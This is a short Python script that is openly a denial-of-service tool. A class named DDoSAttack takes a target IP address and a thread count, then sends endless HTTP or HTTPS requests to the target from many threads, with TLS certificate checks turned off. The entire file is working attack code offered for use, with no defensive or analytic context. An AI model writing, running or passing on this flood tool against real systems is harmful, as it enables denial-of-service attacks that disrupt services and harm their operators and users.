import threading
import argparse
import ssl
import urllib.request
import ipaddress


class ArgParser():
    def parse_args(self):
        parser = self._setup_arg_parser()
        args = parser.parse_args()
        if self._check_valid_ip(args.target):
            return args
        
    def _setup_arg_parser(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('-t', '--target', required=True)
        parser.add_argument('-th', '--threads', default=10, type=int)
        parser.add_argument('-p', '--port', default=443, type=int)
        return parser
    
    @staticmethod
    def _check_valid_ip(ip):
        try:
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            print("error: not a valid ip")
            quit()


class SSLContextRequestCreator():
    def __init__(self, port=443):
        self.port = port
    def _create_ssl_scontext(self):
        scontext = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        scontext.check_hostname = False
        scontext.verify_mode = ssl.VerifyMode.CERT_NONE
        return scontext
    
    def _create_request(self):
        scontext = self._create_ssl_scontext()
        if self.port == 443:
            url = f'https://{self.target}'
        else:
            url = f'http://{self.target}'
        urllib.request.urlopen(url=url, context=scontext)


class DDoSAttack(SSLContextRequestCreator):
    def __init__(self, target, threads=10, port=443):
        super().__init__(port)
        self.target = target
        self.threads = threads
    
    def _run(self, thread):
        attack_num = 1 
        while True:
            print(f'attack {attack_num} from thread {thread}')
            self._create_request()
            attack_num += 1

    def _start_thread(self, thread):
        thread = threading.Thread(target=self._run, args=(thread,))
        thread.start()

    def start_attack(self):
        for thread in range(1, self.threads+1):
            self._start_thread(thread)


if __name__=="__main__":   
    args = ArgParser().parse_args()
    attack = DDoSAttack(args.target, args.threads, args.port)
    attack.start_attack()    